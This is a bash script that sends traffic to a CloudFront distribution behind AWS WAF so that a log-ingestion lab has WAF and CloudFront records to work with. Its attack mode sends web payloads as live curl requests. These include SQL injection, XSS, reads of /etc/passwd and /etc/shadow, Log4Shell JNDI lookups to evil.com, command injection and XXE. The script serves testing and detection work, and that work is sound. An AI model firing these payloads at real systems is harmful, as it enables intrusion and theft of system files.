#!/usr/bin/env bash
#
# Generate traffic against a CloudFront distribution protected by AWS WAF.
#
# Every request generates BOTH:
#   - A WAF log record (via WAF -> Firehose -> Rawtree)
#   - A CloudFront real-time log record (via CF -> Kinesis -> Firehose -> Rawtree)
#
# Usage:
#   ./generate-traffic.sh <cloudfront-domain> [rounds] [--legit]
#
# Options:
#   --legit   Send only legitimate traffic (no attack payloads)
#
# Examples:
#   ./generate-traffic.sh d1234abcdef.cloudfront.net
#   ./generate-traffic.sh d1234abcdef.cloudfront.net 20
#   ./generate-traffic.sh d1234abcdef.cloudfront.net 100 --legit
#
set -euo pipefail

DOMAIN="${1:?Usage: $0 <cloudfront-domain> [rounds] [--legit]}"
ROUNDS="${2:-10}"
LEGIT_ONLY=false
for arg in "$@"; do
  [[ "$arg" == "--legit" ]] && LEGIT_ONLY=true
done

BASE="https://${DOMAIN}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

echo "=== Rawtree Ingestion Lab Traffic Generator ==="
echo "Target:  ${BASE}"
echo "Rounds:  ${ROUNDS}"
echo "Mode:    $( $LEGIT_ONLY && echo "legitimate only" || echo "mixed (legit + attack)" )"
echo ""

for i in $(seq 1 "$ROUNDS"); do
  echo "--- Round ${i}/${ROUNDS} ---"

  # Legitimate traffic — uses -w to print status directly, no subshell capture
  curl -s -o /dev/null -w "  [%{http_code}] legit-index\n"    --max-time 10 -H "User-Agent: ${UA}" "${BASE}/"
  curl -s -o /dev/null -w "  [%{http_code}] legit-health\n"   --max-time 10 -H "User-Agent: ${UA}" "${BASE}/api/health"
  curl -s -o /dev/null -w "  [%{http_code}] legit-users\n"    --max-time 10 -H "User-Agent: ${UA}" "${BASE}/api/users"
  curl -s -o /dev/null -w "  [%{http_code}] legit-search\n"   --max-time 10 -H "User-Agent: ${UA}" "${BASE}/api/search?q=alice&page=1"
  curl -s -o /dev/null -w "  [%{http_code}] legit-login\n"    --max-time 10 -H "User-Agent: ${UA}" "${BASE}/api/login"
  curl -s -o /dev/null -w "  [%{http_code}] legit-orders\n"   --max-time 10 -H "User-Agent: ${UA}" "${BASE}/api/orders"
  curl -s -o /dev/null -w "  [%{http_code}] legit-static\n"   --max-time 10 -H "User-Agent: ${UA}" "${BASE}/index.html"
  curl -s -o /dev/null -w "  [%{http_code}] legit-upload\n"   --max-time 10 -H "User-Agent: ${UA}" "${BASE}/api/upload"
  curl -s -o /dev/null -w "  [%{http_code}] legit-options\n"  --max-time 10 -H "User-Agent: ${UA}" -X OPTIONS -H "Origin: https://example.com" "${BASE}/api/health"
  curl -s -o /dev/null -w "  [%{http_code}] legit-page2\n"    --max-time 10 -H "User-Agent: ${UA}" "${BASE}/api/users?page=2&limit=25"
  curl -s -o /dev/null -w "  [%{http_code}] legit-admin\n"    --max-time 10 -H "User-Agent: ${UA}" "${BASE}/admin/dashboard"
  curl -s -o /dev/null -w "  [%{http_code}] legit-orders2\n"  --max-time 10 -H "User-Agent: ${UA}" "${BASE}/api/orders?status=pending"
  curl -s -o /dev/null -w "  [%{http_code}] legit-post\n"     --max-time 10 -H "User-Agent: ${UA}" -X POST -H "Content-Type: application/json" -d '{"name":"charlie","email":"c@example.com"}' "${BASE}/api/users"

  if ! $LEGIT_ONLY; then
    # SQL Injection
    curl -s -o /dev/null -w "  [%{http_code}] sqli-param\n"   --max-time 10 "${BASE}/api/users?id=1%20OR%201=1"
    curl -s -o /dev/null -w "  [%{http_code}] sqli-union\n"   --max-time 10 "${BASE}/api/users?id=1%20UNION%20SELECT%20*%20FROM%20users--"
    curl -s -o /dev/null -w "  [%{http_code}] sqli-login\n"   --max-time 10 "${BASE}/api/login?user=admin'%20OR%20'1'='1"
    curl -s -o /dev/null -w "  [%{http_code}] sqli-search\n"  --max-time 10 "${BASE}/api/search?q=1%27%3BDROP%20TABLE%20users--"
    curl -s -o /dev/null -w "  [%{http_code}] sqli-body\n"    --max-time 10 -X POST -d "username=admin&password=' OR 1=1 --" "${BASE}/api/login"

    # XSS
    curl -s -o /dev/null -w "  [%{http_code}] xss-query\n"    --max-time 10 "${BASE}/search?q=<script>alert(1)</script>"
    curl -s -o /dev/null -w "  [%{http_code}] xss-param\n"    --max-time 10 "${BASE}/api/users?name=<img%20src=x%20onerror=alert(1)>"
    curl -s -o /dev/null -w "  [%{http_code}] xss-header\n"   --max-time 10 -H "Referer: <script>alert('xss')</script>" "${BASE}/"

    # Path traversal / LFI
    curl -s -o /dev/null -w "  [%{http_code}] lfi-etc\n"      --max-time 10 "${BASE}/../../etc/passwd"
    curl -s -o /dev/null -w "  [%{http_code}] lfi-dotdot\n"   --max-time 10 "${BASE}/api/../../../etc/shadow"
    curl -s -o /dev/null -w "  [%{http_code}] lfi-upload\n"   --max-time 10 "${BASE}/api/upload?file=../../../etc/passwd%00"
    curl -s -o /dev/null -w "  [%{http_code}] lfi-admin\n"    --max-time 10 "${BASE}/admin/../../etc/shadow"

    # Log4Shell / JNDI
    curl -s -o /dev/null -w "  [%{http_code}] log4j-header\n" --max-time 10 -H "X-Api-Key: \${jndi:ldap://evil.com/a}" "${BASE}/"
    curl -s -o /dev/null -w "  [%{http_code}] log4j-ua\n"     --max-time 10 -H "User-Agent: \${jndi:rmi://evil.com/exploit}" "${BASE}/"
    curl -s -o /dev/null -w "  [%{http_code}] log4j-param\n"  --max-time 10 "${BASE}/api/users?search=\${jndi:ldap://evil.com/x}"

    # Command injection
    curl -s -o /dev/null -w "  [%{http_code}] cmdi-param\n"   --max-time 10 "${BASE}/api/health?cmd=;cat%20/etc/passwd"
    curl -s -o /dev/null -w "  [%{http_code}] cmdi-pipe\n"    --max-time 10 "${BASE}/api/health?input=|ls%20-la"

    # Suspicious user agents
    curl -s -o /dev/null -w "  [%{http_code}] ua-nikto\n"     --max-time 10 -H "User-Agent: Nikto/2.1.6" "${BASE}/"
    curl -s -o /dev/null -w "  [%{http_code}] ua-sqlmap\n"    --max-time 10 -H "User-Agent: sqlmap/1.7" "${BASE}/"
    curl -s -o /dev/null -w "  [%{http_code}] ua-nmap\n"      --max-time 10 -H "User-Agent: Nmap Scripting Engine" "${BASE}/"
    curl -s -o /dev/null -w "  [%{http_code}] ua-dirbuster\n" --max-time 10 -H "User-Agent: DirBuster-1.0-RC1" "${BASE}/"

    # Malformed
    curl -s -o /dev/null -w "  [%{http_code}] bad-method\n"   --max-time 10 -X TRACE "${BASE}/"
    curl -s -o /dev/null -w "  [%{http_code}] bad-proto\n"    --max-time 10 -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "${BASE}/api/users"
  fi

  sleep 1
done

REQS_PER_ROUND=13
$LEGIT_ONLY || REQS_PER_ROUND=38
TOTAL=$((ROUNDS * REQS_PER_ROUND))

echo ""
echo "=== Done: ${ROUNDS} rounds, ~${TOTAL} requests sent ==="
echo ""
echo "Next steps:"
echo "  1. Wait 1-2 minutes for logs to be delivered via Firehose"
echo "  2. Check your Rawtree tables:"
echo "     - WAF logs table (default: waf_logs)"
echo "     - CloudFront real-time logs table (default: cloudfront_logs)"
echo ""
